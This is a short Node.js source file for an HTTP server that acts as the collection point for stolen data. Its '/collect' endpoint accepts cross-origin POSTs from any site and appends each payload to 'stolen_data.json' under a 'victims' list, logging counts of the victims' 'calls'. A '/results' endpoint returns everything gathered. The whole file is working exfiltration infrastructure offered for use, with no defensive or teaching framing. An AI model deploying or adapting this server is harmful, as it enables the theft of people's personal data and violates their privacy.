const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = process.env.PORT || 3000;
const RESULTS_FILE = './stolen_data.json';

if (!fs.existsSync(RESULTS_FILE)) {
  fs.writeFileSync(RESULTS_FILE, JSON.stringify({ victims: [] }, null, 2));
}

const server = http.createServer((req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    return res.end();
  }

  if (req.method === 'POST' && req.url === '/collect') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
      try {
        const data = JSON.parse(body);
        const results = JSON.parse(fs.readFileSync(RESULTS_FILE));
        results.victims.push({ timestamp: new Date().toISOString(), ...data });
        fs.writeFileSync(RESULTS_FILE, JSON.stringify(results, null, 2));
        console.log('Data received:', data.calls?.total_count || 0, 'calls');
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end('{"status":"ok"}');
      } catch (e) {
        res.writeHead(400);
        res.end('{"error":"bad json"}');
      }
    });
    return;
  }

  if (req.method === 'GET' && req.url === '/results') {
    const results = JSON.parse(fs.readFileSync(RESULTS_FILE));
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify(results, null, 2));
  }

  // Serve index.html for all other GET requests
  const htmlPath = path.join(__dirname, 'public', 'index.html');
  if (fs.existsSync(htmlPath)) {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    return res.end(fs.readFileSync(htmlPath));
  }

  res.writeHead(200, { 'Content-Type': 'text/html' });
  res.end('<h1>Ready</h1>');
});

server.listen(PORT, () => console.log('Running on port ' + PORT));
